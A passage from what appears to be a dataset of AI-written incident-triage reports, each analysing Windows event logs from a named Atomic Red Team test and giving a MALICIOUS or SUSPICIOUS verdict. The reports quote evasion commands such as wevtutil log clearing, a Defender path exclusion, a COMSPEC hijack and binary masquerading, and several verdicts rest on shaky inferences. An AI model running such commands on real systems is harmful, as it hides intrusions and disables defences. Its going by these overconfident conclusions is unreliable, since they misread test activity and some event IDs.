6. **Indicators of Persistence Mechanisms:**
   - Modifications to `HKLM:\Software\Policies\Microsoft\Windows NT\CurrentVersion\Winlogon` registry keys to automate logon sessions suggest establishing persistence in the system.

### Assessment of Malicious Activity or Compromise
The combination of registry manipulations via PowerShell, the clearing of event logs shortly after the PowerShell execution, and suspicious utilization of `wevtutil.exe` and `conhost.exe` indicate a coordinated attempt to modify system settings potentially for persistence and to obscure activities by clearing logs.

Tamper with Windows Defender Evade Scanning -Folder,"### Detailed Analysis:

**Suspicious Behavior Observed:**

1. **PowerShell Activity:**
   - The logs indicate several PowerShell events with the use of `Add-MpPreference` to exclude a path (`C:\Temp`) from Windows Defender scans. This behavior is often associated with attempts to hide malicious activities from antivirus or other security monitoring tools.
   - The PowerShell command executed has high integrity level, which is a concern because it indicates elevated permissions. The command's source, `C:\Users\ADMIN_~1\AppData\Local\Temp\`, is also suspicious as this directory is frequently used for malware staging.

2. **Event Log Clearing:**
   - Numerous instances of `wevtutil.exe` being used to clear event logs (e.g., Sysmon, Application, Security, Windows PowerShell). This can be indicative of an attempt to cover up potentially malicious actions by deleting evidence of registry changes, process creations, or other suspicious activity.
   - Recorded under the user `SERVER002\admin_test`, who executed with high integrity, suggests the account has escalated privileges.

3. **Logon and Privilege Events:**
   - Multiple logons using NTLM authentication and the privilege escalation evidenced by event ID 4672, which includes privileges like `SeDebugPrivilege`, `SeTakeOwnershipPrivilege`, etc. These privileges can be misused to gain further control of the system or domain environment.
   - The account `admin_test` is involved, reinforcing concerns about the account being compromised or used inappropriately.

4. **Time Manipulation:**
   - There are entries suggesting that system time adjustments were made (Kernel-General Event ID 1), potentially to disrupt chronological ordering in logs or timestamps for activities.

**Assessment:**

- The combination of PowerShell scripting for path exclusion, log clearing commands, privilege escalation activities, and time adjustment attempts are well-known indicators of malicious behavior, likely designed to obscure hacking activities and maintain persistence on the system.

### Conclusion:

- **Resolution: MALICIOUS**

This collection of log entries indicates a strong likelihood of malicious activity on the host, potentially indicating a compromised account (`admin_test`) executing unauthorized actions to cover its tracks using advanced techniques. Immediate mitigation actions are recommended to secure the environment.

Masquerading - cscript.exe running as notepad.exe,"Upon reviewing the logs provided, several suspicious activities and potential indicators of malicious behavior are observed:

1. **Log Clearing Events**:
    - Multiple instances of the `wevtutil.exe` command are noted in Sysmon logs to clear several event logs (Sysmon, Application, Security, and Windows PowerShell). The execution of commands to clear logs is a well-known tactic used by malicious actors to cover their tracks and is a red flag.
    - Corresponding system log event IDs 104 indicate that logs were cleared by the user `admin_test`, without any backup path. This aligns with the behavior captured in Sysmon logs where `wevtutil.exe` is used.

2. **Unusual Command Execution**:
    - Execution of `cmd.exe` with a command copying `cscript.exe` to `notepad.exe` and then executing it under the guise of `notepad.exe` is noted. This type of behavior is indicative of a possible attempt to evade detection by renaming a known utility.
    - The command parameterizes `%SystemRoot%` and `%APPDATA%`, further suggesting an attempt to disguise the actual intent.

3. **Suspicious Process Execution**:
    - The execution of potentially benign utilities (such as `hostname.exe`, `whoami.exe`) is observed, but it is the context and frequency, especially clustered around the log-clearing events, that raises suspicion. Running these utilities in quick succession is often done in reconnaissance phases of an intrusion.

4. **EDR Alert on CEO's Machine**:
    - Given that the alert was triggered on the CEO's machine, the presence of administrative actions, audit log clearing, and unusual process activity raises the severity of the situation. Attackers often target high-privileged accounts and controllers for broader access and data exfiltration.

5. **Security Update and Windows Update**:
    - The updates observed in the system logs for Microsoft Defender Antivirus seem legitimate but should be juxtaposed with the other malicious indicators for a complete picture, although they don't show any immediate signs of compromise.

**Assessment**:
The use of built-in Windows utilities in potentially obfuscated ways, the removal of logs without backup, and renaming and execution of binaries in an unusual manner strongly suggest an active attempt to compromise the system and maintain persistence while evading detection.

**Resolution**:
- **MALICIOUS**: The combination of log-clearing activities, disguised script host execution, and suspicious sequence of commands and processes indicates intentional malicious behavior. Immediate security measures should be taken.

**Guidance on How to Proceed**:
1. **Isolation**: Immediately isolate the machine from the network to prevent further spread or exfiltration of data.
2. **Forensic Investigation**: Conduct a full forensic analysis of the machine to identify the scope of the breach and uncover potential backdoors or indicators of compromise.
3. **Password Changes**: Enforce a company-wide password change, especially for high-privileged accounts.
4. **Security Review**: Review permissions, logs, and EDR settings for potential lapses and ensure robust monitoring for further indicators of malicious activity.
5. **Incident Report**: Document the findings and actions taken for compliance and future security adjustments."
Set-Up Proxy Server,"Based on the analysis of the provided logs, I have identified several factors that suggest suspicious activity, warranting further investigation:

1. **Clearing of Event Logs**: There are multiple entries related to the clearing of event logs by the user 'admin_test' on SERVER002. Logs were cleared for the System, Security, and Windows PowerShell channels using the `wevtutil` command-line utility, as indicated by Sysmon EventID 1 logs showing the execution of `wevtutil.exe` with the `cl` (clear log) argument. The rapid sequence and completeness of log clearing across channels suggest an attempt to cover tracks and is indicative of potentially malicious behavior.

2. **Process Execution and Command-Line Arguments**: The execution of `cmd.exe` with a command to modify the registry (`reg add ... /v ProxyServer...`) to set a proxy server configuration is concerning. This could be indicative of a configuration change that redirects or intercepts network traffic, which is often used in malicious contexts for man-in-the-middle attacks or data exfiltration.

3. **Use of High-Integrity Level Processes**: Many of the processes executed, including those related to registry changes and the clearing of logs, were running with a high integrity level, suggesting elevated privileges that are typical in unauthorized administrative actions.

4. **Absence of Legitimate Justifications**: No visible justifications or legitimate maintenance activities correlate with the execution patterns provided in the logs. High-integrity-level activities performed by user 'admin_test' seem abnormal in the absence of scheduled or documented maintenance procedures.

5. **Potential Exploitation of Services**: While the logs do not directly show an exploit, the conjunction of elevated privileges, log clearance, and registry manipulation raises the likelihood of exploitation or at least preparation stages of an attack.

### Resolution:
**SUSPICIOUS** - The identified activities and patterns reflect suspicious behavior that necessitates further investigation. These activities could be indicative of a compromise or insider action aimed at maintaining persistence, data manipulation, or pre-attack setup. 

### Guidance on How to Proceed:
- **Immediate Containment**: If feasible, isolate the affected machine from the network to prevent potential lateral movement or further command controls.
- **User Activity Review**: Investigate 'admin_test' user activity and verify the legitimacy of actions. Confirm the user's activities with internal logs or user interviews.
- **Log Backup and Detailed Analysis**: Even though logs were cleared, attempt to retrieve them from backups. If backups are unavailable, utilize other monitoring tools that may have cached data to understand the full scope.
- **Forensic Investigation**: Conduct a more detailed forensic analysis to understand if further actions, beyond those in the logs, were executed. Use file integrity monitoring to check for unauthorized changes to the filesystem.
- **Review Security Policies & Controls**: Ensure proper policies are in place to prevent unauthorized clearing of logs and restrict administrative-level access to critical tools like `wevtutil`.
- **Network Traffic Monitoring**: Enhance network traffic analysis, especially focusing on anomalies or indications that align with proxy configuration changes."
Registry-free process scope COR_PROFILER,"### Analysis of the Windows Event Logs:

1. **Application Log:**
   - The application log shows an error related to the .NET Runtime loader. This can often be benign unless the profiler CLSID `{09108e71-974c-4010-89cb-acf471ae9e2c}` or the involved process directory is suspicious.
   - The `edgeupdate` services are shown to have stopped twice during this timeframe, which is normal behavior for software updates and maintenance activities.

2. **Security Log:**
   - The clearing of security logs (Event ID 1102) by a user with administrative privileges (`admin_test`) is highly suspicious. This action often indicates an attempt to cover tracks following potentially unauthorized or malicious activity.

3. **System Log:**
   - Like the security log, the system log also shows that logs were cleared (Event ID 104) by the same user, which is highly suspicious.

4. **Windows PowerShell Log:**
   - The PowerShell logs contain entries that capture sessions where environment variables related to .NET profiling are set, and a foreign DLL is being loaded: `C:\Users\ADMIN_~1\AppData\Local\Temp\AtomicRedTeam\T1574.012\bin\T1574.012x64.dll`. This behavior aligns with an attack scenario laid out by the Atomic Red Team’s documentation for research and simulation of adversary tactics. These entries are particularly suspicious.

5. **Sysmon Log:**
   - Multiple entries show the execution of `wevtutil.exe` to clear event logs, specifically targeting all major logs, which further supports the suspicion of malicious activity.
   - The execution of various Windows utilities like `whoami.exe`, which could be used for reconnaisance, and `tiworker.exe` and `trustedinstaller.exe`, likely related to normal system processes, but their occurrence here in context raises questions parallel to potential post-exploitation activities.
   - The .NET profiler changes and subsequent PowerShell executions align with techniques for host deregistration with persistent profiling.

### Assessment

The combined suspicious behavior, such as clearing of event logs by an administrator, the setting of profiling environment variables with foreign DLLs, and the use of utilities like `whoami.exe`, combined with known attack techniques from Atomic Red Team emulations, strongly suggests malicious activities.

### Resolution

Based on the detailed analysis:
- **Resolution: MALICIOUS**

### Guidance

1. **Immediate Actions:**
   - Isolate the machine `Server002` to prevent further potential spread or exfiltration of data.
   - Conduct a full forensic analysis to gather and preserve evidence and attempt to restore cleared logs if possible.
   - Review the integrity of critical files and configurations on the machine.
   
2. **Remediation:**
   - Change credentials for the affected account and any potentially compromised accounts.
   - Patch and update all software to address any vulnerabilities used for initial access.
   
3. **Fortification:**
   - Enhance monitoring on privileged accounts and employ stricter controls over who can perform log clearance.
   - Implement endpoint detection and response (EDR) tools to monitor and alert on similar behaviors in the future."
Dynamic API Resolution-Ninja-syscall,"Analyzing the provided logs, I see several concerning activities that may indicate malicious behavior or unauthorized activities. Here's the detailed analysis:

1. **Log Clearing Activity:**
   - The logs show event log clearing activities across multiple logs (System, Security, and Windows PowerShell channels) by the user `admin_test`. Log clearing (Event 104) is a common technique used by malicious actors to hide their tracks, indicating a potential attempt to cover up malicious activities on the machine. This activity is typically suspicious unless done under legitimate maintenance or policy-driven tasks, which should be verified with the IT department or system administrators.

2. **Suspicious PowerShell Execution:**
   - A PowerShell script executed invoking `ninja_syscall1.exe` located in `C:\Users\ADMIN_~1\AppData\Local\Temp\AtomicRedTeam\T1027.007\bin\`. The presence of ""AtomicRedTeam"" typically relates to security testing and learning material, possibly indicating either a penetration test or malicious activity mimicking legitimate security tools. 
   - The script also included removing a file `hello.log`, which further adds to the suspicion of attempting to manipulate or remove traces.

3. **Use of Sysmon for Tracking:**
   - Sysmon logs show multiple instances of process creation and termination closely following the PowerShell activity, including instances of `wevtutil.exe` used to clear event logs. The sequence of events is tightly packed and executed under a high integrity level, which suggests a methodical approach to managing logs and processes.

4. **EDR Alert on CEO Machine:**
   - The context indicates that an alert was generated on the CEO's machine, and given that 'AtomicRedTeam' is present, this could imply an adversary might be running common penetration testing or post-exploitation frameworks that include tools like these.

5. **Failed Login Attempts and Credentials Access:**
   - Multiple Event ID 5379 suggest failed attempts to access Microsoft accounts and WindowsLive services, possibly indicating password spraying or credential scanning activity.

6. **Updates:**
   - Regular system updates (using `wuauclt.exe` and related processes) are normal operations, observed here but do not negate the suspicious behavior mentioned above, suggesting mixed legitimate and potentially malicious activities.

**Assessment:**
Based on the clearing activities, the suspicious PowerShell execution, and the usage of potential security testing tools possibly without proper authorization, these logs display a Suspicious pattern of activity. It suggests either unauthorized internal activity, a penetration test without notification, or malicious action trying to mimic penetration testing tools.

**Resolution: SUSPICIOUS**

**Recommendations:**
- Conduct a forensic investigation to determine the origin and intention of the `ninja_syscall1.exe` execution.
- Verify whether the actions, particularly log clearing, were part of authorized tasks (e.g., IT maintenance or security assessments).
- Check for any anomalies or symptoms of compromise on the CEO's machine and the network.
- Temporarily limit administrative accounts' ability to clear logs without audit trails.
- Enhance monitoring and alerting on usage patterns of PowerShell execution and similar script utilizations.
- If this activity is earmarked as unauthorized and potentially malicious, initiate incident response procedures."
Delete a single file - Windows PowerShell,"Upon analyzing the logs provided, several observations indicate potentially malicious behavior:

### 1. **PowerShell Context**:

- Numerous entries in the Windows PowerShell log indicate the execution of a PowerShell command intended to delete a file: `powershell.exe & {Remove-Item -path $env:TEMP\\deleteme_T1551.004}`. This could be considered suspicious, particularly if it was not expected or sanctioned for routine tasks. The actions pertain to deleting items in what appears to be a temporary directory, which is a common tactic for malware cleanup or log evasion.

### 2. **Sysmon Context**:

- The Sysmon logs detail the execution of `wevtutil.exe` with the command line actions to clear various logs, such as the Security, Application, and System logs: 
  - `""C:\\Windows\\system32\\wevtutil.exe\"" cl Application""`, 
  - `""C:\\Windows\\system32\\wevtutil.exe\"" cl System""`,
  - `""C:\\Windows\\system32\\wevtutil.exe\"" cl Security""`.
  
  This behavior is highly indicative of malicious activity, as attackers often clear logs to cover their tracks after conducting unauthorized activities.

- The same logs show that the `admin_test` user had high integrity level operations, indicating the likelihood of elevated privileges being used during these actions.

### 3. **System and Security Context**:

- Both System and Security logs were cleared by the user `SERVER002\\admin_test`, which is a definitive action observed in attempts to obscure malicious or unauthorized activities.

### 4. **Risk Assessment and Observations**:

- **Log Clearing**: The act of clearing system, security, and other logs is a critical indicator of potential malicious activity. It signifies an attempt to hide tracks or suppress evidence of further unauthorized access.
  
- **Usage of PowerShell**: PowerShell is a powerful tool, frequently used by attackers for its ability to execute almost any command that can be run on a system.

### Conclusion:

Given the above findings, particularly the combination of PowerShell and Sysmon logs documenting file deletions and event log clearing through `wevtutil.exe`, these behaviors suggest actions typical of an incident attempting to evade detection. The fact that the `admin_test` user was involved, even if possibly compromised, elevates the severity as potentially serious insider threats or compromised accounts.

### Resolution:

- **MALICIOUS**: The logs contain activities that are almost certainly indicative of malicious actions, given the usage of `wevtutil` to clear logs and the use of PowerShell to attempt file removals under the context of an administrative action.

### Guidance:

1. **Immediate Containment**: Isolate the affected machine (Server002) from the network to prevent any further potential compromise.
2. **User Account Review**: Investigate the `admin_test` account for further suspicious activities or signs of compromise. Consider resetting credentials and reviewing account security.
3. **Audit Retention and Alerting**: Ensure logs are forwarded and retained in a secure location, reducing the risk that malicious actors can clear logs without recourse.
4. **Detailed Forensic Investigation**: Conduct a deeper forensic analysis of the endpoint to trace the origin and scope of the activity.
5. **Communication with Stakeholders**: Notify the IT Security team and relevant stakeholders immediately to coordinate further investigation and response efforts.

Continued vigilance and remediation actions are recommended to address potential security gaps."
Modify Internet Zone Protocol Defaults in Current User Registry - cmd,"In the provided Windows event logs, there are several indicators of potentially malicious activity. Here's a detailed breakdown of the findings:

### Suspicious or Anomalous Behavior
1. **Event Log Clearing**:
    - The System, Windows PowerShell, and Security logs were cleared around the same timestamp (`2024-10-24 17:37:08`). This is often a technique used by attackers to cover their tracks after executing nefarious activities.

2. **Use of `wevtutil.exe`**:
    - Multiple instances of `wevtutil.exe` (Eventing Command Line Utility) were executed to clear different event logs, including Sysmon and Security. The command line arguments used indicate an intention to clear logs, which is atypical in routine operational activity.

3. **Registry Modifications via `cmd.exe`**:
    - A `cmd.exe` process was launched to modify registry settings related to the Internet settings (`ZoneMap\\ProtocolDefaults`). This type of activity could be indicative of attempts to lower security settings within the browser context, which might be a preparation step for further exploitation.

4. **Process Execution and Anomalies**:
    - Command-line executions of utilities like `whoami.exe` and `hostname.exe` may be typical, but in this context, after the logs were cleared, they contribute to suspicious activity.
    
5. **Unusual TimeChanges**:
    - System time was adjusted (`EventID 4616` under Security logs), which can sometimes be a tactic used to manipulate log timestamps.

### Assessment of Malicious Activity
- The sequence and types of operations observed—log clearing, registry modifications, and use of system information tools—all align with activities commonly associated with malicious intent, specifically persistent threat actors aiming to conduct activities stealthily.

### Conclusion
Given the combination of log clearance, registry modifications, and the context in which these occurred, these activities suggest malicious intent.

### Resolution
**MALICIOUS**

### Guidance on How to Proceed
1. **Immediate Containment**:
   - Isolate the affected system (Server002) from the network to prevent potential lateral movement.

2. **Forensic Analysis**:
   - Investigate the origin of the login session used (`admin_test`) for unauthorized activities. Cross-reference with user activity logs.
   - Examine the hash values provided in the Sysmon logs to determine if there are known threats.

3. **Threat Hunting**:
   - Conduct a full security audit for abnormal activities across the network.
   - Review historical logs and backup records for any gaps or additional signs of compromise.

4. **Remediation and Hardening**:
   - Ensure security patches are up-to-date, especially concerning Windows system utilities and browsers.
   - Reinstate and employ strict logging policies, ensuring logs are archived rather than deleted.
   - Update user training and awareness programs focusing on the importance of secure practices and recognizing potential compromises.

Taking prompt actions based on these findings will help mitigate any immediate risks and improve security posture for the future."
Invoke CHM with Script Engine and Help Topic,"### Analysis of the Windows Event Logs:

#### 1. Log Clearing Activity:
- **Event ID 1102 in the Security Log:** The event indicates that the Security Event log was cleared by the user ""admin_test"" on ""SERVER002"". The clearing of event logs, especially security logs, is often considered suspicious as it is a tactic often employed by malicious actors to cover their tracks.

- **Event ID 104 in the System Log:** Similar log clearing activity was noted for the System and Windows PowerShell logs, also executed by ""admin_test"". These actions are in close temporal proximity to the observed malicious or suspicious behavior.

#### 2. Use of PowerShell:
- **Sysmon Event ID 1 (Process Creation Logs):** Indicates a PowerShell script execution with the command line: `""powershell.exe"" & {Invoke-ATHCompiledHelp ...}"". The command attempts to use a potentially suspicious `Invoke-ATHCompiledHelp` function with JScript. This activity is concerning as PowerShell is commonly used for script-based attacks. The script might be part of an exploit or unwanted remote access tool.

#### 3. Use of Eventing Command Line Utility (wevtutil):
- **Sysmon Process Creation Events:** Multiple instances of `wevtutil.exe` being executed to clear logs were noted. The use of `wevtutil` to clear logs is indicative of an attempt to remove traces of specific activities, which aligns with malicious intent.

#### 4. Concurrent Processes:
- Various processes such as `conhost.exe` were frequently spawned after several occurrences of `wevtutil.exe`, reflecting typical behavior that matches log clearing, wherein host console applications are used to facilitate process executions without user visibility.

#### 5. System Integrity and High-Integrity Execution:
- Several processes, including PowerShell, `wevtutil.exe`, `SearchProtocolHost.exe`, `SearchFilterHost.exe`, and other system-critical processes, were executed with high integrity, which provides significant privilege to the actions performed by these processes.

### Assessment and Guidance:
- **Situation:** The log clearing events, coupled with the potentially malicious use of PowerShell and `wevtutil.exe`, strongly suggest malicious activity. The timeline shows coordinated actions to remove traces of this activity.

- **Threats/Risks:** The primary concern is the unauthorized access or manipulation activities on the CEO's machine. The behavior observed points to a deliberate attempt to employ evasion techniques by an attacker who had some level of access and intent to maintain persistence.

- **Guidance:** Immediate investigation is required. Actions such as:
  - Conduct a full forensic analysis of the CEO's machine.
  - Gather additional logs and system snapshots if available.
  - Review access logs for the account ""admin_test"" to determine illegitimate use and possibly compromised credentials.
  - Ensure that logging and monitoring systems are correctly configured and protected against tampering.
  - Review and, if necessary, revoke any anomalous privileges granted during the period in question.

### Resolution:
- **MALICIOUS:** The logs indicate deliberate malicious activity. The combination of log clearing, use of PowerShell for potential script execution, and unauthorized use of system utilities suggests intruder activity seeking to evade detection. Immediate remediation actions are advised."
UACME Bypass Method 31,"Based on the provided Windows event logs and a detailed examination of the entries, the analysis is as follows:

### Analysis:

1. **Event Log Clearing**:
   - Multiple log entries indicate the clearing of event logs on the system at virtually the same time (18:01:49). The following entries are notable:
     - **Security Log**: EventID 1102 indicates the security log was cleared.
     - **System Log**: EventID 104 indicates the system and the Windows PowerShell log channels were cleared.
   - The user ""admin_test"" on ""SERVER002"" performed these actions. This is a significant indicator of potential malicious activity since attackers often clear logs to cover their tracks.

2. **Process Execution**:
   - **Processes Executed** by ""admin_test"":
     - `cmd.exe` with the command line referencing ""Akagi64.exe"" under a directory path related to ""AtomicRedTeam"" and ""ExternalPayloads"". Atomic Red Team is a well-known repository for testing attack techniques, typically used in a controlled cyber security testing environment. However, its presence in an unexpected context may be suspicious.
     - `wevtutil.exe cl` (Event utility tool): It was used to clear logs across different channels, notably the Security, System, and Microsoft-Windows-Sysmon/Operational logs.
   - **PowerShell Usage**:
     - There is activity from `powershell.exe` with a name pattern typical for script execution used to check file paths, which can potentially signify post-exploitation or reconnaissance scripting.

3. **Anomalous Behavior**:
   - The simultaneous clearing of multiple logs and running potentially suspicious executable files like ""Akagi64.exe"" often constitutes part of a pattern of malicious activity, potentially involving privilege escalation or evasive actions to hide activities.
   - ""uacme"" and ""Akagi64.exe"" references suggest possible User Account Control (UAC) bypass attempts, which are commonly seen in scenarios where privilege escalation is intended.

4. **Legitimate Background Activity**:
   - The logs also contain multiple processes related to ""Microsoft Edge Update"". These are standard for updating browser software and typically run under the System integrity level. Detected updates could be part of normal system maintenance.

### Conclusion:

Based on the evidence, there is significant suspicious activity:
- The simultaneous clearing of crucial logs by a user with administrative privileges.
- Execution of scripts and binaries associated with known attack simulation frameworks and potential privilege escalation tools.

### Resolution: **MALICIOUS**

Given the analyzed data, the activity is assessed as malicious. The following steps are recommended:
- Initiate a full incident response investigation on ""SERVER002"".
- Isolate the affected system to prevent further potential spread within the network.
- Review access logs and potentially compromised accounts to evaluate any unauthorized access.
- Conduct a vulnerability assessment and scrutiny of administrative credentials and clearance levels involved.
- Ensure that any suspicious executables or potentially injected binaries are quarantined and analyzed.

Immediate action should be taken to contain the situation and mitigate further risk to the network."
Modify UseTPMKey Registry entry,"Upon analyzing the provided Windows event logs, multiple instances of potential suspicious activities can be identified. The focus should be on the unusual process executions and command-line activities noted, particularly by the `admin_test` user on `Server002`. Here’s the detailed analysis:

### Suspicious/Anomalous Behaviors:

1. **Event Log Clearing:**
   - Multiple entries show the use of `wevtutil.exe` to clear logs for various channels (e.g., System, Security, PowerShell). Event log clearing is a common tactic used by attackers to cover their tracks (Sysmon Event ID 5 and Security Event ID 1102).
   - The `admin_test` user is performing these actions, potentially indicating an insider threat or compromised admin account.

2. **Command Execution with `cmd.exe` and `reg.exe`:**
   - The execution of `cmd.exe` with the command `reg add ""HKLM\SOFTWARE\Policies\Microsoft\FVE"" /v UseTPMKey /t REG_DWORD /d 2 /f` indicates registry manipulation. This manipulation could modify BitLocker settings, suggesting possible preparation for data exfiltration or encryption changes (Sysmon Event IDs 1 and 5).
   - The parent process of this command was `wsmprovhost.exe`, which could indicate a script or remote execution.

3. **Time Manipulation Events:**
   - Event changes related to system time in conjunction with the specific timing and sequence of events could indicate an attempt to disrupt security logs or backdate activities. This could potentially skew the detection timelines for activities and cover malicious actions (Security Event ID 4616).

### Malicious Activity Indicators:

- The clearing of logs and registry changes strongly suggest malicious activity due to their potential to cover tracks and modify system behavior.
- The sequence and nature of processes spawned by the `admin_test` user are indicative of unauthorized activities rather than normal administrative tasks.

### Assessment and Resolution:

Given that multiple abnormal and high-risk activities—like log clearing and registry alterations—are observed without any administrative changes being previously flagged or scheduled, there are strong indicators of a potential breach or insider threat on the `Server002`.

**Resolution: MALICIOUS**
- The combination of event log clearing, registry manipulations, and potentially suspicious time-change activities provide enough evidence to classify this as malicious activity.

### Recommended Actions:

1. **Immediate User Account Investigation:**
   - Temporarily disable the `admin_test` account and evaluate recent activities and access history.
   - Check for any unauthorized access to other accounts or systems.

2. **Forensic Analysis:**
   - Perform a deeper forensic analysis on the affected host to identify any malware or scripts responsible for these actions.
   - Review any related network traffic for data exfiltration and other suspicious communication.

3. **System and Network Hardening:**
   - Review and potentially tighten endpoint detection and response (EDR) configurations.
   - Ensure that logging and auditing are correctly set up and protected against manipulation.

4. **Response Coordination:**
   - Coordinate with legal and compliance teams for potential data breach notification and further investigation.
   - Engage with IT operations to ensure system integrity and prepare to restore from backups if necessary.

5. **Continuous Monitoring:**
   - Increase monitoring on similar hosts and across the network for similar suspicious actions.
   - Setup alerts to catch similar activities immediately in the future. 

Prompt, informed actions are necessary to mitigate the risk and understand the full extent of the compromise."
Masquerading - wscript.exe running as svchost.exe,"In analyzing the provided Windows event logs, a few key points and suspicious patterns emerge, particularly surrounding the actions of the user ""admin_test"". Here are the findings and their implications:

### Suspicious or Anomalous Behavior:

1. **Clearing Event Logs:**
   - Multiple events related to clearing logs (Event ID 1102 from the Security log and Event ID 104 from the System log) have been detected. These actions were performed by the user ""admin_test."" Log clearing is typically associated with attempts to cover tracks and is a common tactic in post-exploitation scenarios.

2. **Execution of `wevtutil` with Log Clearing:**
   - The use of `wevtutil.exe` appears in the Sysmon log, with command-line invocations that directly clear various logs (`cl` command is for clearing logs). This reinforces the intent to cover tracks.

3. **Command Execution Evidence:**
   - There are entries in the Sysmon logs that capture the execution of `cmd.exe` with a command line that includes copying `wscript.exe` to `svchost.exe` and executing a VBScript (`T1036.003_masquerading.vbs`). This behavior is suspicious as it represents an attempt to masquerade processes, a technique used often during the execution of malicious scripts.

4. **Unusual Script Execution:**
   - Execution of a script using `svchost.exe`, which is modified to run a script as indicated by the command line parameters, is highly suspicious. This kind of activity is often related to malicious scripting or persistence mechanisms.

### Indicators of Malicious Activity:

- The activity carried out by the user ""admin_test"" showcases typical behaviors aligned with malicious intent, such as:
  - Clearing event logs, a strong indication of attempts to hide malicious activity.
  - Execution of suspicious commands copying and running scripts which suggest potentially harmful operations or configurations being made without typical administrative purposes.
  
The set of activities corresponds to techniques seen in attack frameworks such as MITRE ATT&CK, specifically those associated with Defense Evasion (T1070.001 - Clear Windows Event Logs) and Execution (T1036.003 - Masquerade Task or Service).

### Assessment and Resolution:

Given the evidence of event log clearing, execution of masked and potentially harmful scripts, and overall clandestine behavior of the identified user, the logs provided contain indicators of compromise that are characteristic of malicious activity.

**Resolution:** **MALICIOUS**

### Guidance:

1. **Immediate Measures:**
   - Isolate the affected host Server002 from the network to prevent further potential malicious activities.
   - Preserve the evidence by capturing memory and acquiring a full disk image for deeper forensic analysis.

2. **Review and Revocation of Credentials:**
   - Investigate how ""admin_test"" acquired privileged access and whether credential theft or misuse occurred. Revoke or reset credentials and investigate broader impacts.

3. **Deploy Security Controls:**
   - Strengthen monitoring and alerting mechanisms to detect similar sequences of log-clearing and execution activities across the network. Use enhanced EDR rules to detect unauthorized uses of utilities like `wevtutil.exe`.

4. **Conduct a Full Security Review:**
   - Perform a thorough investigation on the system and network logs to identify lateral movement or additional compromised systems.
   - Evaluate overall security posture and patch management to ensure comprehensive protection against exploitable vulnerabilities.

5. **User and Staff Communication:**
   - Inform relevant stakeholders of the findings and invoke necessary incident response interventions tailored against the scope and impact of the detected malicious activity."
manage-bde.wsf Signed Script Command Execution,"**Detailed Analysis of the Logs**

After careful examination of the provided logs, the following observations can be made:

### Suspicious or Anomalous Behavior:
1. **Event Log Clearing**:
   - Multiple entries indicate the use of the `wevtutil` command-line utility to clear event logs (`System`, `Security`, and `Windows PowerShell` channels). This behavior is suspicious as attackers often clear logs to cover their tracks.
   - The action was performed by the user `SERVER002\\admin_test`.

2. **Suspicious Command Execution**:
   - A `cmd.exe` process execution was captured with the command line: `""cmd.exe"" /c set comspec=%windir%\System32\calc.exe & cscript %windir%\System32\manage-bde.wsf`. This command tries to temporarily alter the `COMSPEC` environment variable to point to `calc.exe`. This is often done to hijack a normal command and redirect its action and might be a technique to bypass security controls or execute unexpected applications.
   - The execution of Windows script host (`cscript.exe`) with `manage-bde.wsf` is also noteworthy within the same context, as it could be used maliciously.

3. **Processes of Concern**:
   - The `wevtutil.exe` is being executed multiple times by `admin_test` for clearing different event logs. This, combined with the command-line arguments, indicates an intentional log clearing sequence.

4. **Lack of Context for Normal Operations**:
   - There are entries showing execution of common utilities like `hostname.exe` and `whoami.exe` which, on their own, are not generally harmful but in conjunction with other behaviors may indicate reconnaissance or environment assessment by a threat actor.

### Malicious Activity or Compromise Indicators:
- The systematic clearing of event logs, paired with peculiar command execution methods, aligns with typical tactics employed by malicious actors to avoid detection and maintain persistence.
- The `admin_test` user is associated with all suspicious activities, indicating that either this account has been compromised, or the actions were taken by someone with insider knowledge.

### Assessment:
- **Resolution: MALICIOUS**
  - The detected behaviors definitively point to hostile actions: log clearance to obfuscate activities and techniques likely aimed at circumventing detection mechanisms.

### Guidance on How to Proceed:
1. **Immediate Response**:
   - Isolate the affected system (Server002) from the network to prevent further spread.
   - Initiate a detailed forensic investigation to trace back the source and method of intrusion.
   - Change all administrative credentials, particularly for the `admin_test` account.

2. **Containment and Eradication**:
   - Review and tighten access controls and audit policies, ensuring sensitive actions are logged comprehensively.
   - Employ endpoint detection and response (EDR) tools to scan for and remove any lingering threats or malware.

3. **Recovery and Reinforcement**:
   - Restore the system from known good backups after ensuring cleanliness.
   - Reinforce systems against similar attacks by deploying updates, patches, and enhancing monitoring for similar suspicious behaviors.

4. **Documentation and Reporting**:
   - Document the incident thoroughly for future reference and learning.
   - Report the incident to relevant authorities or internal compliance teams as required.

5. **Awareness Training**:
   - Conduct security awareness training for admins and staff to familiarize them with recognizing early signs of compromise and suspicious activity. 

These measures will help ensure that future incidents are identified and managed more effectively."
Bypass UAC by Mocking Trusted Directories,"### Log Analysis:

1. **Log File Clearing Activity**: 
   - **Event ID 1102 (Security log cleared)** and **Event ID 104 (System logs cleared for System and PowerShell)** by user `admin_test` on `Server002`. The command `wevtutil.exe cl` used aggressively indicates attempts to cover tracks, common in post-exploit scenarios.
   - **Sysmon Event ID 1 and 5** indicate that ""wevtutil.exe"" is run multiple times to clear various logs (Sysmon, Application, Security).

2. **Privilege Escalation/Lateral Movement Indicators**:
   - **Event ID 4672** indicates that the user `admin_test` was provided with a list of sensitive privileges (`SeDebugPrivilege`, `SeTakeOwnershipPrivilege`, etc.), indicative of a privileged account used for a specific task, potentially malicious.
   - **Event ID 4624** shows two logon events using NTLM authentication from a remote workstation `DESKTOP-3HL5B2P`, appearing immediately before and after privilege assignment, which could suggest lateral movement.

3. **Time Configuration Changes**:
   - **Event ID 4616** and **Kernel General events** indicate time changes. This manipulation might be to alter timestamps to evade detection in logs.

4. **Suspicious Command Execution**:
   - **Sysmon Event ID 1** highlights execution of commands with `cmd.exe` to create directories in system paths and strategic file manipulations like creating a symbolic link (`mklink`). The command aims to manipulate system paths and binaries, potentially for persistence or bypass measures.
   
5. **Process Execution**: 
   - Suspicious chaining of processes; `wevtutil.exe` with `conhost.exe`, indicates console operations possibly for carrying out unseen operations or maintaining persistence.
   - Execution of `whoami.exe` (`Sysmon Event ID 1`) is common in adversarial post-exploitation, used to verify current access levels.
   
### Assessment:

The sequence of events strongly suggests malicious activity. The following points emphasize this:

- **Clearing of Event Logs**: Repeated use of `wevtutil.exe cl` to clear various logs indicates attempts to cover tracks.
- **Privilege Exploitation**: The list of privileges granted and immediate actions following suggest exploitation and post-exploitation behaviors aimed at maintaining access and escalating privileges.
- **Timestamp Modifications**: Changing system times to obfuscate logs is a common method for attackers to hide their interactions.
- **Suspicious Commands**: The creation and manipulation of files in system directories via `cmd.exe` commands raise red flags for potential persistence mechanisms or payload deployment.

### Resolution:
**MALICIOUS**

### Recommendations:
